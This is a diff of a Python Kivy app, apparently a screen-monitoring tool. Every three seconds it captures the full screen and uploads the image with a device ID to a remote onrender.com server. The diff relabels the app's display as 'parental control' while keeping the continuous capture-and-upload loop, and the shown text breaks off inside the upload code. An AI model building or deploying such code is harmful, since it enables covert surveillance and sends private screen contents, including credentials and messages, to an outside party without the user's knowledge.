@@ -1,24 +1,25 @@
 from kivy.app import App
 from kivy.uix.label import Label
 from kivy.clock import Clock
-from plyer import screenshot
 import requests
 import uuid
 import os
+from PIL import ImageGrab  # capturas en Windows
 
-# CONFIGURACIÓN
-SERVER_URL = "https://dios-ybjy.onrender.com/upload-screenshot"
-DEVICE_ID = str(uuid.getnode())  # ID único del dispositivo
+SERVER_URL = "https://dios.onrender.com/upload-screenshot"
+DEVICE_ID = str(uuid.getnode())
 
 class ControlApp(App):
     def build(self):
-        Clock.schedule_interval(self.capture_and_upload, 3)  # cada 3 segundos
-        return Label(text="Control activo")
+        Clock.schedule_interval(self.capture_and_upload, 3)
+        return Label(text="Control parental activo")
 
     def capture_and_upload(self, dt):
-        filename = f"screenshot.png"
+        filename = "screenshot.png"
         try:
-            screenshot.take(filename)
+            img = ImageGrab.grab()
+            img.save(filename)
+
             with open(filename, 'rb') as f:
                 files = {'file': (filename, f, 'image/png')}
                 data = {'device_id': DEVICE_ID}
